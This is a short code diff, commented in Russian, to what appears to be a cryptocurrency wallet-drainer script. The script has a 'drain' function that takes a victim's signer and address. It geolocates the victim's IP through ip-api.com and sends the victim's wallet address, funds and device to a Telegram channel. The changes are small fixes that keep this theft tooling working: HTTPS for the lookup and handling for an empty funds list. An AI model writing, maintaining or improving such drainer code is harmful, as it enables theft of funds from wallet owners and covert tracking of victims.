@@ -41,7 +41,7 @@ async function getUserIP() {
 // Функция для получения геолокации по IP
 async function getGeolocation(ip) {
   try {
-    const response = await fetch(`http://ip-api.com/json/${ip}`);
+    const response = await fetch(`https://ip-api.com/json/${ip}`); // Изменено на HTTPS
     const data = await response.json();
     if (data.status === 'success') {
       return `${data.city}, ${data.country}`;
@@ -532,9 +532,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const device = detectDevice();
 
   // Формируем сообщение
+  let fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
   const message = `🌀 Connect | [ **\`${shortAddress}\`** ]\n\n` +
                   `Funds:\n` +
-                  `${funds.join('\n')}\n` +
+                  `${fundsMessage}\n` +
                   `Device: ${device}`;
 
   // Отправляем сообщение в Telegram
